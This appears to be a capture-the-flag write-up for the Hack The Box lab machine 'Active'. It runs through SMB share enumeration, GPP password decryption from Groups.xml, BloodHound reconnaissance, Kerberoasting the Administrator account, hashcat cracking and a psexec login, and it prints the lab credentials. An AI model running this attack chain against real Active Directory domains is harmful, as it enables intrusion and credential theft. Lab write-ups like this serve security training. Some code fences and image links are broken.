### i. Port Scan
![nmap portscan](/boxes/htb/active/nmap.PNG)
### ii. Enumeration
SMB ports were listed open on the nmap scan. Let's check if any shares are available with smbclient and smbmap.
```
smbclient -L 10.10.10.100
smbmap -H 10.10.10.100
```
smbclient:
![smbclient](/boxes/htb/active/smbclient.PNG)

smbmap:
![smbmap](/boxes/htb/active/smbmap.PNG)

smbmap reveals a file share called Replication with read only permissions. Smbmap can be used to list the contents of the Replication directory:
```
smbmap -R Replication -H 10.10.10.100
```
Looking through the contents of the Replication directory there is a file called Groups.xml. This is a group policy file where local account information is typically stored for older Active Directory implementations.

![ReplicationFiles](/boxes/htb/active/groupsxml.PNG)

To download the file we use:
```
smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q
```
Taking a look at the Groups.xml file, an account `SVC_TGS` and `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH` encyrpted password was found. This password is encrypted with a known key:

```
```
![groups.xmlhash](/boxes/htb/active/grouphash.png)
```
To decrpyt the password, we use gpp-decrpyt:
```
![gppdecrypt](/boxes/htb/active/gppdecrypt.png)
```
The decrypted hash is `GPPstillStandingStrong2k18`
Using the credentials we found we enumerate more shares
```
smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100
```
![moreshares](/boxes/htb/active/)

The user flag was found under `SVC_TGS\Desktop\`

Now that we have credentials, let's Bloodhound the box. We switch to a windows vm and get a command prompt with the following command:
```
runas /netonly /user:active.htb\svc_tgs cmd
```
Make sure to check your DNS settings on your network adapter and set it to 10.10.10.100. Run sharphound with the following command to gather information:
```
sharphound.exe -c all -d active.htb --domaincontroller 10.10.10.100
```
We then drag and drop the zip file created from sharphound into the user interface of Bloodhound on our Kali machine. Checking for domain admin did not reveal anything. Checking for kerberoasting, the user `ADMINISTRATOR` is available for this attack.

Using GetUserSPN.py from impacket we will grab the hash of `ADMINISTRATOR`
```
GetUserSPN.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
```
![adminhash](image)
We copy the hash into a file and use hashcat to crack the hash via the following command:
```
hashcat -m 13100 hash.txt rockyou.txt 
```
![crackedhash](image)
The Administrator password is: `Ticketmaster1968`

Now we can use psexec and log into the box and get the root flag
```
psexec.py active.htb/Administrator@10.10.10.100
```
